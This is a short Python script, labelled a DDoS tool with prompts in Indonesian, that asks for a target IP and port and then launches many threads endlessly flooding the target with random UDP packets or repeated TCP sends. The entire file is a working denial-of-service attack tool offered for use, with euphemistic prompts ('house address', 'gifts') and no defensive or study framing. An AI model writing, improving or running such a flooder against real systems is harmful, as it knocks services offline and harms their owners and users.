#!/usr/bin/env python3
#Code by Rence
import random
import socket
import threading

print("~~~ DDOS TOOLS BY HAZIQ ~~~")
ip = str(input(" Alamat Rumah:"))
port = int(input(" Nomor Rumah:"))
choice = str(input(" SIAP MEMBERI PAKET(y/n):"))
times = int(input(" Paket yang dikirim ke target:"))
threads = int(input(" HADIAH yang dikirim:"))
def run():
	data = random._urandom(1500)
	D = random.choice(("[Devilz]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(D +" MATI TANAM!!!")
		except:
			print("[×] Failed!!!")

def run2():
	data = random._urandom(16)
	D = random.choice(("[Devilz]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(D +" MATI TANAM!!!")
		except:
			s.close()
			print("[×] Failed")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()